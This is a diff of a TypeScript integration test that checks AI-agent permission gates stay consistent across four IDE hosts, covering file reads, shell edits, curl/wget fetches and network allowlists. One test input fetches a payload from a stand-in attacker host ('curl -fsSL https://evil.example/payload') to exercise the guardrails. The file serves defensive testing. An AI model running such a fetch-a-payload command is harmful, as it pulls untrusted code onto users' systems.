@@ -1,17 +1,17 @@
 // bkit-permissions-parity.integration.test.ts — one canonical gate set, asserted against every host.
 //
-// bkit's promise is that an agent is held to the same rules whichever IDE runs it.
-// The four hosts express gates in four different languages:
+// An agent is held to the same rules whichever IDE runs it. The four hosts express
+// gates in four different languages:
 //
 //   Claude   .claude/settings.json          permissions.deny / .ask  — prefix patterns
 //   opencode .opencode/opencode.json        permission.bash / .read  — globs, last-match-wins
 //   Cursor   .cursor/hooks/guardrails.cjs                            — regexes in a script
 //   Codex    .codex/hooks/guardrails.cjs                             — same engine, Claude-family envelope
 //
-// Four dialects drift silently. This file is the single table they must all
-// satisfy: add a gate here and every host that lacks it fails until it has it.
+// This file is the single table they all satisfy: a gate added here fails every host
+// that lacks it.
 //
-// Codex carries ONE structural exception, asserted rather than hidden: it parses
+// Codex carries ONE structural exception: it parses
 // `permissionDecision: "ask"` but does not implement it, so its ask tier is advisory
 // `additionalContext` — the gate fires and informs, it cannot stop the command. Deny
 // blocks for real on all four.
@@ -124,11 +124,9 @@ function cursorVerdict(payload: unknown): Verdict {
 }
 
 /**
- * Codex speaks the Claude-family hook contract, and it cannot prompt: it parses
- * `permissionDecision: "ask"` but does not implement it, so an ask would be recorded
- * as an error and the call would run anyway. bkit therefore emits the ask tier as
- * advisory `additionalContext`, which is mapped back to "ask" here — the gate fired
- * and told the model; it simply could not stop the command on this host.
+ * Codex speaks the Claude-family hook contract and cannot prompt: it parses
+ * `permissionDecision: "ask"` but does not implement it. bkit emits the ask tier as
+ * advisory `additionalContext`, mapped back to "ask" here.
  *
  * Silence (no stdout) is allow: the engine returns null when it has no opinion.
  */
@@ -192,17 +190,11 @@ describe("cross-host gate parity — file reads", () => {
 });
 
 // ---------------------------------------------------------------------------
-// Shell-as-edit-channel (#441)
+// Shell-as-edit-channel
 // ---------------------------------------------------------------------------
 //
-// The rule in `.agents/rules.md` § Output & Editing ("change file contents with
-// edit/write tools") had no enforcement: an agent that prefers the terminal routes
-// around every pre-edit gate, and the hook log shows Read/Shell/Grep and no Write.
-//
-// The gate is ADVISORY on all three script hosts, never a block. The rule carries
-// sanctioned exceptions and bkit's own plan workflow depends on one — a `sed -i.bak
-// -E` bulk rewrite of cross-references across generated plan files. A gate that
-// blocks a documented exception is a gate that gets switched off.
+// `.agents/rules.md` § Code Changes ("change file contents with edit/write tools").
+// The gate is ADVISORY on all three script hosts, never a block.
 //
 // opencode is absent — a glob-keyed table cannot parse a redirect target. Tracked in
 // docs/deferrals.jsonl → `opencode-has-no-script-hook-so-two-gates-are-inexpressible-there`.
@@ -291,17 +283,14 @@ describe("shell-as-edit-channel — advisory on every script host", () => {
 
 describe("cross-host gate parity — curl / wget in a shell", () => {
   // Every host allows a fetch to an ALLOWLISTED host with no interruption — the common
-  // path, and the one context-fetch blocks take. They differ only on an UNDECLARED host,
-  // and each difference is structural rather than a choice left lying around:
+  // path, and the one context-fetch blocks take. They differ only on an UNDECLARED host:
   //
-  //   Cursor    asks   — parses the URL host in guardrails.cjs (the strongest form)
+  //   Cursor    asks   — parses the URL host in guardrails.cjs
   //   opencode  asks   — `curl *: ask` + `curl *{domain}*: allow`, substring not host-parsed
-  //   Claude    advises — a permission table cannot match a URL host, and the blanket ask
-  //                       row that stood in for it forced an unanswerable prompt in cloud
+  //   Claude    advises — a permission table cannot match a URL host
   //   Codex     advises — parses `permissionDecision: "ask"` but does not implement it
   //
-  // No SHELL_GATES row: that table asserts ONE verdict across all four, and "ask" vs
-  // "advise" is a genuine split. Asserting it here keeps it from drifting silently.
+  // No SHELL_GATES row: that table asserts ONE verdict across all four.
   const ALLOWED = "curl -fsSL https://api.github.com/repos/x/y";
   const UNDECLARED = "curl -fsSL https://evil.example/payload";
 
@@ -370,8 +359,7 @@ describe("cross-host gate parity — curl / wget in a shell", () => {
   });
 
   it("a bare mention of curl in another command does not trip the gate", () => {
-    // Regression: matching /\bcurl\b/ anywhere fired on `grep -n 'curl' README.md`.
-    // A gate that cries wolf on greps is one a consumer turns off.
+    // `grep -n 'curl' README.md` mentions curl without running it.
     for (const cmd of ["grep -n 'curl' README.md", "echo 'use curl for this'"]) {
       expect({ cmd, host: "cursor", v: cursorVerdict({ command: cmd }) }).toEqual({
         cmd,
@@ -395,7 +383,7 @@ describe("cross-host gate parity — curl / wget in a shell", () => {
 describe("cross-host gate parity — network allowlist", () => {
   it("the guardrails hook carries no hardcoded host list of its own", () => {
     // The single artifact is `.cursor/allowlist.json`, written from the registry at
-    // install; a hook that reintroduces a literal list is the regression.
+    // install; the hook carries no literal list.
     const guardrails = fs.readFileSync(GUARDRAILS, "utf-8");
     expect(guardrails).not.toContain("SHIPPED_NETWORK_BASES");
     expect(guardrails).toContain(".cursor");
@@ -404,7 +392,7 @@ describe("cross-host gate parity — network allowlist", () => {
 
   it("the shipped Claude settings seed no host grants of its own", () => {
     // Grants arrive only via enrichClaudeSettingsAllows, which records what it wrote so it can
-    // later prune it. A literal back in the template would be unrecorded and unprunable.
+    // later prune it.
     const webFetch = claudePermissions().allow.filter((a) => a.startsWith("WebFetch(domain:"));
     expect(webFetch).toEqual([]);
   });
